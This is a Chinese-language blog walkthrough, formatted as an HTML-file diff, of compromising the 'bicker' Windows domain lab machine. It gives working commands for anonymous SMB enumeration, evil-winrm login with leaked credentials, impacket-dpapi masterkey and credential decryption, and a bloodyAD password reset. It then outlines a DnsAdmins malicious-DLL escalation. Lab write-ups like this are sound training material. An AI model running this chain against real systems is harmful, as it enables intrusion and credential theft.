@@ -1,0 +1,1125 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    bicker靶机 |
+    
+    S@Ku_yA的blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="bicker靶机复现端口信息1nmap -T4 -A -v 192.168.20.130    发现大量开放端口 smb匿名访问尝试匿名访问smb 123smbclient -L &#x2F;&#x2F;192.168.20.130  -N-L #表示列出对应服务器的目录-N #表示不用密码登录 匿名登录   可以匿名访问 发现有几个奇怪的东西puppy 我们下载下来看看   查看图片元数据一张奇怪的图片 我们使用e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bicker靶机">
+<meta property="og:url" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="S@Ku_yA的blog">
+<meta property="og:description" content="bicker靶机复现端口信息1nmap -T4 -A -v 192.168.20.130    发现大量开放端口 smb匿名访问尝试匿名访问smb 123smbclient -L &#x2F;&#x2F;192.168.20.130  -N-L #表示列出对应服务器的目录-N #表示不用密码登录 匿名登录   可以匿名访问 发现有几个奇怪的东西puppy 我们下载下来看看   查看图片元数据一张奇怪的图片 我们使用e">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118200645139.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118200822370.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118201551624.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118201815671.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118201759162.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118201928950.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118202214296.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118202240742.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118202742223.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118202950196.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118203500515.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118203535943.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118203637002.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118203807750.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118204000903.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118204928665.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118211018542.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118211444581.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119211702851.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118212326856.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119212311774.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119212334969.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119212710615.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119213037504.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119213139904.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119213227622.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119213340793.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119214145096.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119214637012.png">
+<meta property="og:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119214754428.png">
+<meta property="article:published_time" content="2025-11-18T11:45:36.000Z">
+<meta property="article:modified_time" content="2025-12-15T07:34:33.825Z">
+<meta property="article:author" content="S@Ku_yA">
+<meta property="article:tag" content="mazesec">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="域渗透">
+<meta property="article:tag" content="打靶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118200645139.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="S@Ku_yA的blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+    
+      
+<link rel="stylesheet" href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css" integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr&#x2F;Io" crossorigin="anonymous">
+
+    
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+    
+  </nav>
+  
+</div>
+<header id="header" aria-label="Site header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="bicker靶机">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <span id="logo">
+            <h1 data-aos="slide-up">bicker靶机</h1>
+          </span>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  
+  <div class="sidebar-wrapper-container sticky">
+  
+    
+    
+  
+ 
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">bicker靶机复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smb%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE"><span class="toc-number">1.2.</span> <span class="toc-text">smb匿名访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9B%BE%E7%89%87%E5%85%83%E6%95%B0%E6%8D%AE"><span class="toc-number">1.3.</span> <span class="toc-text">查看图片元数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#winrm"><span class="toc-number">1.4.</span> <span class="toc-text">winrm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.5.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="toc-number">1.6.</span> <span class="toc-text">提权思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E8%A7%A3%E5%AF%86"><span class="toc-number">1.7.</span> <span class="toc-text">凭证解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E9%92%A5"><span class="toc-number">1.8.</span> <span class="toc-text">破解密钥</span></a></li></ol></li></ol>
+  
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">23</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">12</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+  
+  <div class="sidebar-widget">
+  
+  </div>
+  
+  </div>
+  
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-bicker靶机复现" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2025-11-18T11:45:36.000Z" itemprop="datePublished">2025-11-18</time>
+    <time style="display: none;" id="post-update-time">2025-12-15</time>
+  </span>
+  
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%9D%B6%E6%9C%BA/" title="靶机">靶机</a>
+  </div>
+
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="bicker靶机复现"><a href="#bicker靶机复现" class="headerlink" title="bicker靶机复现"></a>bicker靶机复现</h1><h2 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -v 192.168.20.130</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118200645139.png" alt="image-20251118200645139"></p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118200822370.png" alt="image-20251118200822370"></p>
+<p>发现大量开放端口</p>
+<h2 id="smb匿名访问"><a href="#smb匿名访问" class="headerlink" title="smb匿名访问"></a>smb匿名访问</h2><p>尝试匿名访问smb</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //192.168.20.130  -N</span><br><span class="line">-L #表示列出对应服务器的目录</span><br><span class="line">-N #表示不用密码登录 匿名登录</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118201551624.png" alt="image-20251118201551624"></p>
+<p>可以匿名访问</p>
+<p>发现有几个奇怪的东西puppy</p>
+<p>我们下载下来看看</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118201815671.png" alt="image-20251118201815671"></p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118201759162.png" alt="image-20251118201759162"></p>
+<h2 id="查看图片元数据"><a href="#查看图片元数据" class="headerlink" title="查看图片元数据"></a>查看图片元数据</h2><p>一张奇怪的图片</p>
+<p>我们使用exiftool工具查看图片的元数据</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118201928950.png" alt="image-20251118201928950"></p>
+<p>发现bilibili和uid</p>
+<p>猜测是一个b站用户</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118202214296.png" alt="image-20251118202214296"></p>
+<p>确实有一个用户</p>
+<p>图文里面有个投稿</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118202240742.png" alt="image-20251118202240742"></p>
+<p>得到aksk</p>
+<p>tindalos:Th3C@ll0fCtHu1hu!</p>
+<h2 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h2><p>靶机开放5985端口服务</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118202742223.png" alt="image-20251118202742223"></p>
+<p>不懂为什么这个端口的服务一直扫不出来</p>
+<p> 实际上这个端口开放的是winrm服务</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118202950196.png" alt="image-20251118202950196"></p>
+<p>可以远程登录并且拿到的shell是powershell</p>
+<p>我们使用evil-winrm工具连接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 192.168.20.130 -u tindalos -p &#x27;Th3C@ll0fCtHu1hu!&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>如果直接拿刚刚登录的aksk去登录的话，没法连上去</p>
+<p>因为靶机的时间过长，导致靶机要强制更新密码</p>
+<p>所有我们需要在vmware上面修改一下密码</p>
+<p>然后在使用新密码登录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 192.168.20.130 -u tindalos -p &#x27;abc!@#123&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>成功登录tindalos用户</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118203500515.png" alt="image-20251118203500515"></p>
+<p>找到user的flag</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118203535943.png" alt="image-20251118203535943"></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>回到user目录看看本机用户</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118203637002.png" alt="image-20251118203637002"></p>
+<p>存在其他2个用户lihua和jianyin</p>
+<p>看看本用户的具体信息</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118203807750.png" alt="image-20251118203807750"></p>
+<p>得到sid和所属组</p>
+<p>其中的dnsadmins组存在提权可能</p>
+<p>该组内用户可以注册dll到dns服务上</p>
+<p>可能导致提权</p>
+<p>我们看看其他用户的信息</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118204000903.png" alt="image-20251118204000903"></p>
+<p>这2个用户都可以被winrm登录</p>
+<p>lihua用户可以对域内用户账号进行修改</p>
+<p>jianyin用户可以重启dns服务</p>
+<h2 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h2><p>那么提权思路就是拿到jianyin用户然后去修改lihua用户的密码</p>
+<p>然后tindalos用户注册一个恶意的dll到dns服务上</p>
+<p>最后lihua用户重启dns服务从而拿到system权限</p>
+<h2 id="凭证解密"><a href="#凭证解密" class="headerlink" title="凭证解密"></a>凭证解密</h2><p>我们现在去看看tindalos用户的漫游凭证</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118204928665.png" alt="image-20251118204928665"></p>
+<p>确实存在一个dpapi加密凭证</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dpapi #data protection api 通常在roaming目录下面的credentials文件里面</span><br><span class="line">用来加密用户数据的api</span><br><span class="line">masterky #在dpapi中用来加密数据的主密钥</span><br><span class="line">sid #安全标识符 作为盐值加密masterkey 通常在roaming目录下面的protect目录里面的sid文件里面</span><br><span class="line">password #用户密码 用来加密masterkey本身</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118211018542.png" alt="image-20251118211018542"></p>
+<p>由于我们之前修改了密码所以要使用最新的masterkey</p>
+<p>我们抓取到这些文件之后就开始破解</p>
+<p>我们先传个马子好继续之后的操作</p>
+<p>也可以传个工具在靶机里面破解</p>
+<p>发现C:&#x2F;wirtetemp这个奇怪的目录</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118211444581.png" alt="image-20251118211444581"></p>
+<p>这个应该是作者留的特殊文件夹</p>
+<p>我们传个马子到这个文件里面然后弹shell出来</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119211702851.png" alt="image-20251119211702851"></p>
+<p>成功上线</p>
+<p>我们去抓凭据文件到kali里面</p>
+<h2 id="破解密钥"><a href="#破解密钥" class="headerlink" title="破解密钥"></a>破解密钥</h2><p>我们使用Impacket-dpapi工具破解masterkey</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251118212326856.png" alt="image-20251118212326856"></p>
+<p>抓到凭据了</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119212311774.png" alt="image-20251119212311774"></p>
+<p>开始破解</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-dpapi masterkey -file 8a0810d5-0e0e-4d7a-8e23-7233dd650ea4  -password &#x27;abc!@#123&#x27; -sid S-1-5-21-298176814-2846777796-698167141-1103</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119212334969.png" alt="image-20251119212334969"></p>
+<p>得到masterkey的值</p>
+<p>我们继续破解</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-dpapi credential -file A2E4656BCBABFD9279E090E8482A7141 -key 0xd318d536c896af2b5daee5a60aae447ea54e6d356b61ea2a740fec42be9735afa48bff404b98fd514c2042ed2b84db69eaa13cc675d8b8d19421da56718cd39f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119212710615.png" alt="image-20251119212710615"></p>
+<p>貌似这个新的masterkey没法用到这个上面</p>
+<p>我们去接旧的masterkey</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-dpapi masterkey -file cb5f08bd-480d-4d6e-9d2d-1d18c94fcb74 -password &#x27;abc!@#123&#x27; -sid S-1-5-21-298176814-2846777796-698167141-1103</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119213037504.png" alt="image-20251119213037504"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-dpapi credential -file A2E4656BCBABFD9279E090E8482A7141 -key 0x0ff22e711e14912c168ec3943e2478081930413b24795f45028bf15992aebc0b5b0954128398441a4c2578c90e5c2da71bc678d8d5a4e66836e9f083e20eeb27</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119213139904.png" alt="image-20251119213139904"></p>
+<p>成功破解</p>
+<p>貌似是lihua的凭据</p>
+<p>这里确实就是lihua的密码 但是直接使用没法连接因为会提示密码过期了</p>
+<p>所有这里提前修改了密码</p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119213227622.png" alt="image-20251119213227622"></p>
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119213340793.png" alt="image-20251119213340793"></p>
+<p>成功登录lihua账号</p>
+<p>这个时候直接去修改yinjian的密码</p>
+<p>我们使用bloodyad去登录lihua并修改</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bloodyAD.py --host 192.168.20.130 -d bicker.com -u lihua -p &#x27;abc!@#123&#x27; set password jianyin &#x27;dhaw23131@$g12&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/18/bicker%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/image-20251119214145096.png" alt="image-20251119214145096"></p>
+<p>成功登录</p>
+<p>现在只需注册恶意dll然后重启dns就可以提权了</p>
